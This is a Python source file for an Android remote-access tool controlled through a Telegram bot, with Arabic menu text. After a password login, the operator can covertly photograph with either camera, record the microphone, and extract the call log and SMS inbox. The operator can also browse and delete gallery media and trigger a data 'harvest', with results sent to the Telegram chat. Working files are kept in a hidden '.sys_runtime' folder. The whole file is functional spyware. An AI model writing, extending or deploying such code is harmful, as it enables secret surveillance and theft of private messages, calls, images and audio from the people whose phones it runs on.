# -*- coding: utf-8 -*-
import os, time, json, threading, logging, hashlib, secrets
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)
logging.basicConfig(
    filename=os.path.join(P, "c.log"),
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

class CommandHandler:
    def __init__(self):
        self.tmp = os.path.join(P, "ctmp")
        if not os.path.exists(self.tmp):
            os.makedirs(self.tmp)
        self._cleanup_tmp()
        self.session_timeout = 900
        self.last_msg = 0

    def _cleanup_tmp(self):
        try:
            now = time.time()
            for f in os.listdir(self.tmp):
                p = os.path.join(self.tmp, f)
                if os.path.getmtime(p) < now - 3600:
                    os.remove(p)
        except:
            pass

    def _hash(self, s):
        return hashlib.sha256(s.encode()).hexdigest()

    def _const_cmp(self, a, b):
        return secrets.compare_digest(a, b)

    def _smart_delay(self, min_gap=0.8):
        now = time.time()
        elapsed = now - self.last_msg
        if elapsed < min_gap:
            time.sleep(min_gap - elapsed)
        self.last_msg = time.time()

    def _send_file(self, tg, cid, content, fn):
        self._smart_delay()
        p = os.path.join(self.tmp, fn)
        try:
            with open(p, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            with open(p, 'rb') as f:
                tg._ap("sendDocument", {"chat_id": cid, "caption": f"📄 {fn}"}, {"document": f})
        except Exception as e:
            logging.error(f"Send file error: {e}")
        finally:
            if os.path.exists(p):
                try: os.remove(p)
                except: pass

    def _bat_ok(self, mon):
        try:
            b, c = mon._bat() if hasattr(mon, '_bat') else (100, False)
            return b >= 15 or c
        except:
            return True

    def _rec_aud(self, dur=10):
        if not JNI:
            return None
        mr = None
        try:
            MR = autoclass('android.media.MediaRecorder')
            out = os.path.join(self.tmp, f"a_{int(time.time())}.aac")
            mr = MR()
            mr.setAudioSource(MR.AudioSource.MIC)
            mr.setOutputFormat(MR.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MR.AudioEncoder.AAC)
            mr.setAudioEncodingBitRate(64000)
            mr.setAudioSamplingRate(44100)
            mr.setOutputFile(out)
            mr.prepare()
            mr.start()
            time.sleep(dur)
            mr.stop()
            return out
        except Exception as e:
            logging.error(f"Audio capture error: {e}")
            return None
        finally:
            if mr:
                mr.release()

    def _get_sys_info(self, mon):
        if not JNI:
            return "N/A"
        try:
            Build = autoclass('android.os.Build')
            StatFs = autoclass('android.os.StatFs')
            Env = autoclass('android.os.Environment')
            path = Env.getDataDirectory().getPath()
            stat = StatFs(path)
            free = (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024**3)
            bat, char = mon._bat() if hasattr(mon, '_bat') else ("??", False)
            return (f"📱 **جهاز:** `{Build.MODEL}`\n"
                    f"⚙️ **نظام:** `Android {Build.VERSION.RELEASE} (API {Build.VERSION.SDK_INT})`\n"
                    f"💾 **مساحة:** `{free:.2f} GB حرة`\n"
                    f"🔋 **بطارية:** `{bat}%` {'🔌 شحن' if char else ''}")
        except:
            return "❌ فشل جلب المعلومات"

    def _call_log(self, lim=100):
        if not JNI:
            return "JNI Error"
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
            if not cursor:
                return "No permission"
            lines = []
            while cursor.moveToNext() and len(lines) < lim:
                name = cursor.getString(cursor.getColumnIndex("name")) or "Unknown"
                num = cursor.getString(cursor.getColumnIndex("number"))
                lines.append(f"👤 {name} ({num})")
            cursor.close()
            return "\n".join(lines) if lines else "No calls"
        except:
            return "Permission Denied"

    def _sms_log(self, lim=100):
        if not JNI:
            return "JNI Error"
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
            if not cursor:
                return "No permission"
            lines = []
            while cursor.moveToNext() and len(lines) < lim:
                addr = cursor.getString(cursor.getColumnIndex("address"))
                body = cursor.getString(cursor.getColumnIndex("body"))
                lines.append(f"📩 From: {addr}\n💬 {body}\n---")
            cursor.close()
            return "\n".join(lines) if lines else "No SMS"
        except:
            return "Permission Denied"

    def _get_main_kb(self, mon):
        devs = getattr(mon, 'dvs', {"5c9037624405fa8b": {"n": "Samsung SM-A235F"}})
        kb = []
        for did, info in devs.items():
            name = info.get('n', 'Unknown')
            kb.append([{"text": f"📱 {name} ({did[:4]})", "callback_data": f"menu_{did}"}])
        kb.append([{"text": "🔄 تحديث القائمة", "callback_data": "refresh_devices"}])
        return kb

    def execute(self, cmd, tg, mon, cid, cbq=None):
        threading.Thread(target=self._run, args=(cmd, tg, mon, cid, cbq), daemon=True).start()

    def _run(self, cmd, tg, mon, cid, cbq):
        try:
            now = time.time()
            if cbq:
                status = "⚡ جاري..."
                if "cam" in cmd:
                    status = "📸 تشغيل الكاميرا..."
                elif "camf" in cmd:
                    status = "🤳 تشغيل الكاميرا الأمامية..."
                elif "mic" in cmd:
                    status = "🎙 تسجيل الصوت..."
                elif "media" in cmd:
                    status = "🖼 جلب المعرض..."
                tg._ap("answerCallbackQuery", {"callback_query_id": cbq, "text": status})

            if cmd.startswith("/login"):
                parts = cmd.split(" ")
                upw = parts[1] if len(parts) > 1 else ""
                stored_hash = getattr(mon, 'pw', '')
                if upw and self._const_cmp(self._hash(upw), stored_hash):
                    mon.auth_active = True
                    mon.last_act = now
                    tg._ap("sendMessage", {
                        "chat_id": cid,
                        "text": "🔐 الواجهة الرئيسية",
                        "parse_mode": "Markdown",
                        "reply_markup": json.dumps({"inline_keyboard": self._get_main_kb(mon)})
                    })
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ كلمة سر خاطئة"})
                return

            if not getattr(mon, 'auth_active', False):
                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 يرجى /login أولاً"})
                return

            if now - getattr(mon, 'last_act', 0) > self.session_timeout:
                mon.auth_active = False
                tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ انتهت الجلسة بسبب الخمول"})
                return
            mon.last_act = now

            if cmd == "logout":
                mon.auth_active = False
                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 تم الخروج"})
                return

            if cmd == "refresh_devices":
                tg._ap("sendMessage", {
                    "chat_id": cid,
                    "text": "🔄 تحديث قائمة الأجهزة",
                    "reply_markup": json.dumps({"inline_keyboard": self._get_main_kb(mon)})
                })
                return

            if cmd.startswith("menu_"):
                did = cmd.split("_")[1]
                kb = [
                    [{"text": "📸 كاميرا خلفية", "callback_data": f"cam_{did}"}, {"text": "🤳 كاميرا أمامية", "callback_data": f"camf_{did}"}],
                    [{"text": "🎙 ميكروفون", "callback_data": f"mic_{did}"}],
                    [{"text": "📞 سجل المكالمات", "callback_data": f"callog_{did}"}, {"text": "💬 SMS", "callback_data": f"sms_{did}"}],
                    [{"text": "🖼 معرض الوسائط", "callback_data": f"media_{did}"}, {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
                    [{"text": "🔙 خروج", "callback_data": "logout"}]
                ]
                tg._ap("sendMessage", {
                    "chat_id": cid,
                    "text": f"🛠 تحكم الجهاز: `{did}`",
                    "parse_mode": "Markdown",
                    "reply_markup": json.dumps({"inline_keyboard": kb})
                })
                return

            if cmd.startswith("media_"):
                did = cmd.split("_")[1]
                if hasattr(mon, 'gallery_browser'):
                    kb = mon.gallery_browser.get_grid_kb(cat="pending", page=0)
                    r = tg._ap("sendMessage", {
                        "chat_id": cid,
                        "text": "🖼 معرض الوسائط",
                        "parse_mode": "Markdown",
                        "reply_markup": json.dumps(kb)
                    })
                    if r and r.get('ok'):
                        mon.last_mid = r['result']['message_id']
                return

            if cmd.startswith("g_nav|"):
                parts = cmd.split("|")
                if len(parts) >= 3:
                    cat, page = parts[1], int(parts[2])
                    if hasattr(mon, 'gallery_browser'):
                        new_kb = mon.gallery_browser.get_grid_kb(cat=cat, page=page)
                        mid = getattr(mon, 'last_mid', None)
                        if mid:
                            tg._ap("editMessageReplyMarkup", {
                                "chat_id": cid,
                                "message_id": mid,
                                "reply_markup": json.dumps(new_kb)
                            })
                return

            if cmd.startswith("g_opt|"):
                parts = cmd.split("|")
                if len(parts) >= 4:
                    cat, page, idx = parts[1], parts[2], parts[3]
                    if hasattr(mon, 'gallery_browser'):
                        mon.gallery_browser.show_options(cid, cat, page, idx)
                return

            if cmd.startswith("g_conf|"):
                parts = cmd.split("|")
                if len(parts) >= 5:
                    act, cat, page, idx = parts[1], parts[2], parts[3], parts[4]
                    confirm_kb = [[
                        {"text": "🗑 تأكيد", "callback_data": f"g_act|del|{cat}|{page}|{idx}"},
                        {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{page}|{idx}"}
                    ]]
                    tg._ap("sendMessage", {
                        "chat_id": cid,
                        "text": "⚠️ حذف دائم؟",
                        "parse_mode": "Markdown",
                        "reply_markup": json.dumps({"inline_keyboard": confirm_kb})
                    })
                return

            if cmd.startswith("g_act|"):
                parts = cmd.split("|")
                if len(parts) >= 5:
                    act, cat, page, idx = parts[1], parts[2], parts[3], parts[4]
                    if hasattr(mon, 'gallery_browser'):
                        mon.gallery_browser.execute_action(cid, act, cat, page, idx)
                return

            parts = cmd.split("_")
            if len(parts) < 2:
                return
            act, did = parts[0], parts[1]

            if act == "cam":
                if not self._bat_ok(mon):
                    tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ بطارية منخفضة"})
                    return
                if hasattr(mon, 'camera_analyzer') and mon.camera_analyzer:
                    path = mon.camera_analyzer.capture(cam_id=0)
                    if path and os.path.exists(path):
                        with open(path, 'rb') as f:
                            tg._ap("sendPhoto", {"chat_id": cid, "caption": f"📸 {did}"}, {"photo": f})
                        try: os.remove(path)
                        except: pass
                    else:
                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التصوير"})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ كاميرا غير متوفرة"})

            elif act == "camf":
                if not self._bat_ok(mon):
                    tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ بطارية منخفضة"})
                    return
                if hasattr(mon, 'camera_analyzer') and mon.camera_analyzer:
                    path = mon.camera_analyzer.capture(cam_id=1)   # الكاميرا الأمامية
                    if path and os.path.exists(path):
                        with open(path, 'rb') as f:
                            tg._ap("sendPhoto", {"chat_id": cid, "caption": f"🤳 {did}"}, {"photo": f})
                        try: os.remove(path)
                        except: pass
                    else:
                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التصوير"})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ كاميرا غير متوفرة"})

            elif act == "mic":
                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 تسجيل 10 ثوانٍ..."})
                path = self._rec_aud(10)
                if path:
                    with open(path, 'rb') as f:
                        resp = tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})
                    if resp and resp.get('ok'):
                        os.remove(path)
                    else:
                        pending = os.path.join(P, "pending_uploads")
                        if not os.path.exists(pending):
                            os.makedirs(pending)
                        os.rename(path, os.path.join(pending, os.path.basename(path)))
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})

            elif act == "callog":
                txt = self._call_log(100)
                self._send_file(tg, cid, txt, f"calls_{did}.log")

            elif act == "sms":
                txt = self._sms_log(100)
                self._send_file(tg, cid, txt, f"sms_{did}.log")

            elif act == "hrv":
                if hasattr(mon, 'daily_zipper') and mon.daily_zipper:
                    mon.daily_zipper.run()
                    tg._ap("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد..."})

            else:
                tg._ap("sendMessage", {"chat_id": cid, "text": f"⚠️ أمر غير معروف: {act}"})

        except Exception as e:
            logging.error(f"Command error: {e}")
            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ خطأ داخلي"})

_handler = None
def execute(data, tg, mon, cid, cbq=None):
    global _handler
    if _handler is None:
        _handler = CommandHandler()
    _handler.execute(data, tg, mon, cid, cbq)
